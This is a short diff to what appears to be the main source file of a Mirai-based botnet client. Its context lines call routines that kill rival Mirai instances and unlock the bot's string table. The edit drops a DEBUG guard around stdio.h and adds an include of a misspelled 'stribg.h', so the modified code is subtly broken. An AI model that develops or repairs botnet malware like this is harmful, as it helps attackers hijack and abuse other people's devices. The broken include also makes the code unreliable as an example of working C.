@@ -1,8 +1,7 @@
 #define _GNU_SOURCE
 
-#ifdef DEBUG
 #include <stdio.h>
-#endif
+#include <stribg.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <sys/socket.h>
@@ -156,7 +155,6 @@ int main(int argc, char **args)
     if (sigaction(SIGBUS, &sa, NULL) == -1)
         perror("sigaction");
 #endif
-
     check_and_exit_self();
     check_and_kill_mirai();
 
@@ -203,7 +201,6 @@ int main(int argc, char **args)
     write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
     write(STDOUT, "\n", 1);
     table_lock_val(TABLE_EXEC_SUCCESS);
-
 #ifdef DEBUG
     int f = fork();
     if (f > 0){
